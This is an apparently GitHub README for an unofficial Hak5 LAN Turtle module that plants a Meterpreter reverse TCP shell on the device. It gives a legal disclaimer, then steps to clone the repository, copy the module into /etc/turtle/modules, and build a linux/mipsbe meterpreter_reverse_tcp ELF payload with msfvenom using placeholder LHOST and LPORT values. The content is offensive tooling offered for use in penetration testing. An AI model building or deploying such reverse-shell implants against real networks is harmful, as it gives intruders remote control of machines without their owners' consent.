## Unofficial custom Hak5 LAN Turtle Module - meterpreter-mipsbe-reverse-tcp

#### LEGAL DISCLAMER
    The author does not hold any responsibility for the bad use of this module, remember that attacking
    targets without prior consent is illegal and punished by law. So use this module responsibly.

#### DOWNLOAD/INSTALL

** 1 - Download module from github**<br />
`git clone https://github.com/ATTACKnDEFEND/LanTurtlemeterpreter-mipsbe-reverse-tcp`

** 2 - copy meterpreter-mipsbe-reverse-tcp to Hak5 Turtle modules directory
`copy meterpreter-mipsbe-reverse-tcp /etc/turtle/modules/meterpreter-mipsbe-reverse-tcp`

** 3 - On Kali generate Meterpreter payload with Msfvenom
`msfvenom -p linux/mipsbe/meterpreter_reverse_tcp LHOST=<HOST> LPORT=<PORT> -f elf > meterpreter-mipsbe-reverse-tcp`





